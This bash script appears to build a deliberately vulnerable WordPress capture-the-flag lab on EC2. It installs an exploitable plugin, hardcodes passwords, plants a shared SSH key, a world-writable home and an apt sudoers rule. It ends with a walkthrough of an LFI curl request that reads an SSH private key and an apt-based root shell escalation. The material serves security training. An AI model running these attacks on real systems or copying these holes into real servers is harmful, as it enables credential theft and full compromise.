#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Run this as root"
    exit
fi

while true; do
    read -p "Did you run 'sudo apt upgrade' and restart the instance? " yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done

read -p 'Enter EC2 Instance DNS Name: ' dnsname
password="Th15p@55w0RdD035n0TW0RkF0RPr1vESC"

updateUbuntu(){
	apt update
	apt install  apache2 \
                 ghostscript \
                 libapache2-mod-php \
                 mysql-server \
                 php \
                 php-bcmath \
                 php-curl \
                 php-imagick \
                 php-intl \
                 php-json \
                 php-mbstring \
                 php-mysql \
                 php-xml \
                 php-zip \
                 unzip  --yes
}

#raise maximum upload size for wordpress
phpUpdate(){
	sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/8.1/apache2/php.ini
}

#creates directories for wordpress and installs latest version
makeWWW(){
	mkdir -p /srv/www
	chown www-data: /srv/www
	wget https://wordpress.org/latest.tar.gz
	sudo -u www-data tar zx -f latest.tar.gz -C /srv/www 
	echo '<VirtualHost *:80>
    	DocumentRoot /srv/www/wordpress
    	<Directory /srv/www/wordpress>
        	Options FollowSymLinks
        	AllowOverride Limit Options FileInfo
        	DirectoryIndex index.php
        	Require all granted
    	</Directory>
    	<Directory /srv/www/wordpress/wp-content>
        	Options FollowSymLinks
        	Require all granted
    	</Directory>
		</VirtualHost>' > /etc/apache2/sites-available/wordpress.conf
	sudo -u www-data echo '
		# BEGIN WordPress
		RewriteEngine On
		RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
		RewriteBase /
		RewriteRule ^index\.php$ - [L]
		RewriteCond %{REQUEST_FILENAME} !-f
		RewriteCond %{REQUEST_FILENAME} !-d
		RewriteRule . /index.php [L]
		<Files xmlrpc.php>
		Order Allow,Deny
		Deny from all
		</Files>
		# END WordPress' > /srv/www/wordpress/.htaccess
}

#creates wordpress database and user
mysqlStuff(){
	mysql --user=root --execute="CREATE DATABASE wordpress;"
	mysql --user=root --execute="CREATE USER wordpress@localhost IDENTIFIED BY 'Th15p@55w0RdD035n0TW0RkF0RPr1vESC';"
	mysql --user=root --execute=" GRANT ALL PRIVILEGES ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES"
	service mysql start
}

#modifies wp-config.php with mysql credentials and raises memory limit
wordPress(){
	sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i "s/password_here/$password/" /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i -e '$adefine("WP_MEMORY_LIMIT", "256M");' /srv/www/wordpress/wp-config.php 
	a2ensite wordpress
	a2enmod rewrite
	a2dissite 000-default
	service apache2 reload
}

#installs vulnerable plugin. installs wordpress cli. initializes wordpress core. adds blog posts/comments. deletes sample pages/posts
moreWordpress(){
	cd /srv/www/wordpress/wp-content/plugins
	#wget https://downloads.wordpress.org/plugin/disable-xml-rpc.1.0.1.zip
	#unzip disable-xml-rpc.1.0.1.zip
	#sudo -u steve wp plugin activate disable-xml-rpc
	wget https://www.exploit-db.com/apps/942d7fab9b7c9ecc8318e8f7a88d52fb-old-post-spinner.zip
	unzip 942d7fab9b7c9ecc8318e8f7a88d52fb-old-post-spinner.zip
	rm *.zip
	cd /tmp;sudo curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
	chmod +x wp-cli.phar
	mv wp-cli.phar /usr/local/bin/wp
	cd /srv/www/wordpress/
	rm -rf wp-content/plugins/akismet
	sudo -u www-data wp core install --url=$dnsname --title="Super Admin Blog" --admin_user=steve --admin_email='jeff@localhost.com' 1>/root/wordpressadmin.txt
	sleep 2
	sudo -u www-data wp post create --post_title="New Update to Super Admin Blog!" --post-author=admin-jeff --post_content="Our brand new admin, Steve, recently installed new plugins to help our great blog run better. Make sure you find them and don’t forget to try them out!" --post_status=publish
	sudo -u www-data wp comment create --comment_author=admin-steve --comment_content="I'm still not sure how to set my home permissions correctly. I think they're too open. Can someone help me?" --comment_post_ID=4
	sudo -u www-data wp comment create --comment_author=admin-jeff --comment_content="I'll help you when I get a chance, Steve. Make sure your ssh keys are protected since we use the same one for the 'shared-admin' account." --comment_post_ID=4
	#sudo -u www-data wp post create --post_title="Be Aggressive! B. E. Agressive!" --post_content="The UM cheerleaders have finally brought home the gold thanks to their aggressive efforts. We could all learn a thing or two about being aggressive from this team. Whenever you're just looking around you should try being aggressive too!" --post_status=publish
	sudo -u www-data wp post delete 1
	sudo -u www-data wp post delete 2
}

#creates users steve and shared-admin. generates ssh keys sets directory permissions. creates admin_note.txt
userStuff(){
	useradd -s /bin/bash -p $(perl -e'print crypt("w0rdpr355I54ann0y1NG", "aa")') -m -N steve
	echo "shared-admin ALL=(root) NOPASSWD: /usr/bin/apt update" >> /etc/sudoers
	echo "shared-admin ALL=(root) NOPASSWD: /usr/bin/apt update *" >> /etc/sudoers
	sudo -u steve mkdir /home/steve/.ssh
	sudo -u steve ssh-keygen -t rsa -m PEM -f /home/steve/.ssh/id_rsa -N ""
	useradd -s /bin/bash -m -N shared-admin
	sudo -u shared-admin mkdir /home/shared-admin/.ssh
	cp /home/steve/.ssh/* /home/shared-admin/.ssh/
	sudo -u shared-admin cp /home/shared-admin/.ssh/id_rsa.pub /home/shared-admin/.ssh/authorized_keys
	chown -R shared-admin /home/shared-admin
	chgrp -R shared-admin /home/shared-admin
	chmod -R 700 /home/shared-admin
	echo -ne "$dnsname root"|md5sum > /root/proof.txt
	echo -ne "$dnsname local"|md5sum > /home/shared-admin/local.txt
	echo -e "\nDon't forget toi0k run the weekly update on this machine.\nYou'll have to do it manually.\nThe shared-admin account has permissions.  -admin" > /home/shared-admin/admin_note.txt
	chmod -R 777 /home/steve
	chmod 644 /home/shared-admin/admin_note.txt
}

#function calls
printf "\n\033[33;1mupdating/installing software\033[0m\n"
updateUbuntu 
printf "\n\033[33;1mcreate user/set sudo and ssh-keys\033[0m\n"
userStuff
printf "\n\033[33;1mmaking directories\033[0m\n"
makeWWW
printf "\n\033[33;1mconfiguring mysql\033[0m\n"
mysqlStuff
printf "\n\033[33;1minstalling wordpress\033[0m\n"
wordPress
printf "\n\033[33;1mchanging php.ini\033[0m\n"
phpUpdate
printf "\n\033[33;1minstall plugins/update database/post content\033[0m\n"
moreWordpress
usermod -s /sbin/nologin ubuntu


# make sure ubuntu and kali are on same network/vpc

###############

# Walkthrough
# nmap -sCV from internal IP finds 22 and wordpress site on 80
# wordpress post calls out new plugins as well as steve having bad home folder permissions and the use of a shared-admin ssh key
# wpscan --url http:// site --plugins-detection aggressive
# finds WordPress Plugin OPS Old Post Spinner 2.2.1
# LFI on plugin pull steve's id_rsa key
# curl http:// site /wp-content/plugins/old-post-spinner/logview.php?ops_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/home/steve/.ssh/id_rsa
# ssh in as shared-admin
# sudo -l finds apt usage
# sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh